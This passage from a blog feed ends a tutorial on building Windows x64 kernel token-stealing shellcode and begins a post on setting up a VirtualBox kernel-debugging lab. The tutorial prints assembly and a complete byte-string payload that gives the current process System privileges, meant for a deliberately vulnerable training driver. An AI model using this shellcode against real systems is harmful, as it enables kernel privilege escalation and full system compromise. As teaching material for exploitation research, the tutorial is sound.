+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ptrProcess&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;curProcess&lt;/span&gt;
+&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ptrProcess&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;UniqueProcessId&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SystemProcess&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;UniqueProcessId&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;ptrProcess&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ptrProcess&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Flink&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Which builds the second part of our shellcode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;;; rax has the pointer to the current KPROCESS&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;
+
+&lt;span class="nl"&gt;__loop:&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rbx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x2e8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;;; +0x2e8  ActiveProcessLinks[0].Flink&lt;/span&gt;
+&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x2e8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;;; nextProcess&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rbx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x2e0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;;; +0x2e0  UniqueProcessId&lt;/span&gt;
+&lt;span class="nf"&gt;cmp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;;; compare to target PID&lt;/span&gt;
+&lt;span class="nf"&gt;jnz&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;__loop&lt;/span&gt;
+
+&lt;span class="c1"&gt;;; here rbx hold a pointer to System structure&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Overwrite the current process token field with &lt;code&gt;System&lt;/code&gt;'s&lt;/h2&gt;
+&lt;p&gt;This is the third and final part of our shellcode, and the easiest since
+everything was done in the steps above:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;;; rax has the pointer to the current KPROCESS&lt;/span&gt;
+&lt;span class="c1"&gt;;; rbx has the pointer to System KPROCESS&lt;/span&gt;
+
+&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rbx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x348&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;;; +0x348  Token&lt;/span&gt;
+&lt;span class="nf"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xf0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;;; we must clear the lowest nibble&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x348&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1&gt;The final shellcode&lt;/h1&gt;
+&lt;p&gt;We add a few extra instructions to correctly save and restore the context, and
+make sure we exit cleanly:&lt;/p&gt;
+&lt;script src="https://gist.github.com/hugsy/763ec9e579796c35411a5929ae2aca27.js"&gt;&lt;/script&gt;
+
+&lt;p&gt;We can now simply use any assembler (NASM, YASM) - but I have a personal preference for &lt;a href="http://keystone-engine.org"&gt;Keystone-Engine&lt;/a&gt; - to generate a bytecode version of our shellcode.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#define LEN 80&lt;/span&gt;
+
+&lt;span class="k"&gt;const&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sc&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;LEN&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x50&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                                             &lt;/span&gt;&lt;span class="c1"&gt;// push rax&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x53&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                                             &lt;/span&gt;&lt;span class="c1"&gt;// push rbx&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x51&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                                             &lt;/span&gt;&lt;span class="c1"&gt;// push rcx&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\x65\xa1\x88\x01\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;// mov rax, gs:0x188&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\x8b\x80\xb8\x00\x00\x00&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="c1"&gt;// mov rax, [rax+0xb8]&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\x89\xc3&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                                     &lt;/span&gt;&lt;span class="c1"&gt;// mov rbx, rax&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\x8b\x9b\xe8\x02\x00\x00&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="c1"&gt;// mov rbx, [rbx+0x2e8]&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\x81\xeb\xe8\x02\x00\x00&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="c1"&gt;// sub rbx, 0x2e8&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\x8b\x8b\xe0\x02\x00\x00&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="c1"&gt;// mov rcx, [rbx+0x2e0]&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\x83\xf9\x04&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                                 &lt;/span&gt;&lt;span class="c1"&gt;// cmp rcx, 4&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x75\x15&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                                         &lt;/span&gt;&lt;span class="c1"&gt;// jnz 0x17&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\x8b\x8b\x48\x03\x00\x00&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="c1"&gt;// mov rcx, [rbx + 0x348]&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\x89\x88\x48\x03\x00\x00&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="c1"&gt;// mov [rax + 0x348], rcx&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x59&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                                             &lt;/span&gt;&lt;span class="c1"&gt;// pop rcx&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5b&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                                             &lt;/span&gt;&lt;span class="c1"&gt;// pop rbx&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x58&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                                             &lt;/span&gt;&lt;span class="c1"&gt;// pop rax&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x58\x58\x58\x58\x58&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                             &lt;/span&gt;&lt;span class="c1"&gt;// pop rax; pop rax; pop rax; pop rax; pop rax; (required for proper stack return)&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\x31\xc0&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                                     &lt;/span&gt;&lt;span class="c1"&gt;// xor rax, rax  (i.e. NT_SUCCESS)&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xc3&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;                                             &lt;/span&gt;&lt;span class="c1"&gt;// ret&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Once copied into an executable location, this shellcode will grant the current
+process with all &lt;code&gt;System&lt;/code&gt; privileges.&lt;/p&gt;
+&lt;p&gt;The next post will actually use this newly created shellcode in a concrete vulnerability exploitation (from the &lt;a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver"&gt;Extremely Vulnerable Driver&lt;/a&gt; by HackSys Team.&lt;/p&gt;
+&lt;p&gt;Until then, take care!&lt;/p&gt;
+&lt;h1&gt;Recommended readings&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href="https://www.amazon.com/Guide-Kernel-Exploitation-Attacking-Core/dp/1597494860"&gt;A Guide to Kernel Exploitation - Attacking The Core&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/"&gt;Introduction To Windows Shellcode Development&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://mcdcyber.wordpress.com/2011/03/07/x64-kernel-privilege-escalation/"&gt;x64 Kernel Privilege Escalation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://support.microsoft.com/en-ca/help/243330/well-known-security-identifiers-in-windows-operating-systems"&gt;Well-Known Security IDentifiers&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://hick.org/code/skape/papers/win32-shellcode.pdf"&gt;Understanding Windows Shellcode&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;</content><category term="tutorial"></category><category term="windows"></category><category term="kernel"></category><category term="debugging"></category><category term="pwn"></category><category term="token"></category><category term="shellcode"></category></entry><entry><title>Setting up a Windows VM lab for kernel debugging</title><link href="https://blahcat.github.io/posts/2017/08/07/setting-up-a-windows-vm-lab-for-kernel-debugging.html" rel="alternate"></link><published>2017-08-07T00:00:00-07:00</published><updated>2017-08-07T00:00:00-07:00</updated><author><name>hugsy</name></author><id>tag:blahcat.github.io,2017-08-07:/posts/2017/08/07/setting-up-a-windows-vm-lab-for-kernel-debugging.html</id><summary type="html">&lt;p&gt;This is the first on a series of posts on Windows kernel debugging and
+exploitation.&lt;/p&gt;
+&lt;p&gt;In this part, we'll cover in details how to get everything setup using Linux as
+host, VirtualBox as hypervisor and Windows virtual images from &lt;a href="http://modern.ie"&gt;Modern.IE&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Note&lt;/em&gt;&lt;/strong&gt;: there is nothing ground-breaking here, those posts are …&lt;/p&gt;</summary><content type="html">&lt;p&gt;This is the first on a series of posts on Windows kernel debugging and
+exploitation.&lt;/p&gt;
+&lt;p&gt;In this part, we'll cover in details how to get everything setup using Linux as
+host, VirtualBox as hypervisor and Windows virtual images from &lt;a href="http://modern.ie"&gt;Modern.IE&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Note&lt;/em&gt;&lt;/strong&gt;: there is nothing ground-breaking here, those posts are mostly notes and
+reminders for the future. &lt;a href="https://hshrzd.wordpress.com/2017/05/28/starting-with-windows-kernel-exploitation-part-1-setting-up-the-lab/"&gt;Other people&lt;/a&gt; did a fantastic job covering the same
+topic, so you might probably be more interested into reading those 😁&lt;/p&gt;
+&lt;p&gt;I like working on a Linux host, so using &lt;a href="https://virtualkd.sysprogs.org"&gt;VirtualKD&lt;/a&gt;
+isn't an option. So my setup is:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Debian testing x64 as host&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.virtualbox.org"&gt;VirtualBox&lt;/a&gt; as hypervisor&lt;/li&gt;
+&lt;li&gt;A
+  &lt;a href="https://web.archive.org/web/20170306074002/https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/"&gt;Windows 7 x64 VM&lt;/a&gt; acting
+  as debugger.&lt;/li&gt;
+&lt;li&gt;And 2 debuggees:&lt;ol&gt;
+&lt;li&gt;Windows 7 x86 VM (using UART as debugging medium)&lt;/li&gt;
+&lt;li&gt;Windows 8.1 x64 VM (using Network as debugging medium)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;As a commodity, I've created a
+&lt;a href="https://github.com/hugsy/modern.ie-vagrant"&gt;&lt;code&gt;Vagrantfile&lt;/code&gt;&lt;/a&gt; to simplify the VM
+creation process using &lt;a href="https://vagrantup.com"&gt;&lt;code&gt;Vagrant&lt;/code&gt;&lt;/a&gt;. You can create a new
+Windows VM like this&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;git&lt;span class="w"&gt; &lt;/span&gt;clone&lt;span class="w"&gt; &lt;/span&gt;https://github.com/hugsy/modern.ie-vagrant&lt;span class="w"&gt; &lt;/span&gt;Windows7
+$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Windows7
+$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;FIRSTBOOT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;vagrant&lt;span class="w"&gt; &lt;/span&gt;up&lt;span class="w"&gt; &lt;/span&gt;--provision
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;and go grab a coffee ☕&lt;/p&gt;
+&lt;h2&gt;Preparing the Debugger VM&lt;/h2&gt;
+&lt;p&gt;Once the VM is created and Windows properly installed, edit the VM settings in
+VirtualBox to do the following:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;In the "Serial Ports" tab, enable one port. You can use any "Port Number"
+    you want, just remember it, as you'll need to specify it to WinDBG the
+    Win7 debuggee is ready. Select &lt;code&gt;Host Pipe&lt;/code&gt; as "Port Mode" and enter a local
+    path in the "Path/Address" field (for example &lt;code&gt;/tmp/win7-kd-pipe&lt;/code&gt;). This
+    pipe will be the relay VirtualBox will use to communicate between the
+    debugger and debuggee through UART. Last, make sure the "Connect to existing
+    pipe/socket" is &lt;strong&gt;unchecked&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/dbg-uart-settings.png"&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;in the "Network" tab, on top of the the default NAT-ed network created by
+    VirtualBox, add and enable another adapter as Host-Only. Then link it to an
+    existing interface on the host (for example &lt;code&gt;vboxnet0&lt;/code&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/dbg-network-settings.png"&gt;&lt;/p&gt;
+&lt;p&gt;Now the debugger is ready, you need to install WinDBG as the kernel debugger. A
+quick way, is to use &lt;a href="https://chocolatey.org/"&gt;&lt;code&gt;Chocolatey&lt;/code&gt;&lt;/a&gt; in an administrator prompt to install it
+as such:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nl"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;@&amp;quot;%SystemRoot%\System32\WindowsPowerShell&lt;/span&gt;&lt;span class="se"&gt;\v&lt;/span&gt;&lt;span class="s"&gt;1.0\powershell.exe&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;NoProfile&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;InputFormat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;None&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ExecutionPolicy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Bypass&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Command&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;iex ((New-Object System.Net.WebClient).DownloadString(&amp;#39;https://chocolatey.org/install.ps1&amp;#39;))&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SET&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey&lt;/span&gt;&lt;span class="se"&gt;\b&lt;/span&gt;&lt;span class="s"&gt;in&amp;quot;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;chocolatey&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;being&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;installed&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="nl"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;choco&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;install&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;force&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;windbg&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Although this won't install the very latest WinDBG, this approach is convenient
+to going through downloading and installing the SDK from MS
+website. Additionally, you can script it to install more tools useful for
+later (&lt;code&gt;python&lt;/code&gt;, &lt;code&gt;ConEmu&lt;/code&gt;, &lt;code&gt;HxD&lt;/code&gt; etc.)&lt;/p&gt;
+&lt;h2&gt;Setup UART debugging on the Windows 7 target&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: All is described
+&lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/boot-parameters-to-enable-debugging"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;All OS can be kernel-debugged via Serial Port (or UART). Although this method is
+universal, it is also the slowest.&lt;/p&gt;
+&lt;p&gt;To enable it, start the Windows 7 debuggee VM, open a &lt;code&gt;cmd.exe&lt;/code&gt; as
+Administrator, and add another entry to the boot loader
+using &lt;code&gt;bcdedit&lt;/code&gt; utility:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\&amp;gt; bcdedit /copy {current} /d &amp;quot;Windows 7 with kernel debug via COM&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Then enable debug mode on new entry UUID:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\&amp;gt; bcdedit /debug {UUID-RETURNED-BY-FORMER-COMMAND} on
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/win7-bcdedit-enable-debug.png"&gt;&lt;/p&gt;
+&lt;p&gt;Now instruct Windows serial communication as debugging medium, and use the
+"fastest" baud rate (i.e 115200 symbols/sec). Since we'll only use serial
+debugging for this VM, we can use the &lt;code&gt;bcdedit /dbgsettings&lt;/code&gt; global switch.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\&amp;gt; bcdedit /dbgsettings serial debugport:1 baud rate:115200
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;Note&lt;/em&gt;: if we wanted to set debug settings specific to one entry of the boot
+loader, we would've used &lt;code&gt;bcdedit /set&lt;/code&gt; instead. For instance:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;bcdedit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;UUID&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;RETURNED&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;BY&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;FORMER&lt;/span&gt;&lt;span 